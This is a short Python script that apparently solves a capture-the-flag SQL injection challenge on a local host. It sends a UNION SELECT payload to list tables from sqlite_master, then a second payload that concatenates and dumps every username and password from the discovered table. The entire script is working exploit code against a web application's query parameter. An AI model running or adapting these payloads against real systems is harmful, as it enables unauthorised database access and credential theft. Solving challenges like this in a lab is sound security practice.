import requests

method = "POST"
site = "http://challenge.localhost"
port = 80

url = f"{site}:{port}/"

# Set body data.
params = {"query": '%" UNION SELECT name FROM sqlite_master WHERE name LIKE \'table%\' --'}

response = requests.request(method, url, params = params)

start_index = response.text.find('table')

if start_index != -1:
    table_name = response.text[start_index:]

else:
    print("The word 'table' was not found in the response.")
    print("Aborting ...")
    exit(1)

params = {"query": f'%" UNION SELECT username || password FROM {table_name} --'}
response = requests.request(method, url, params = params)
print(response.text)
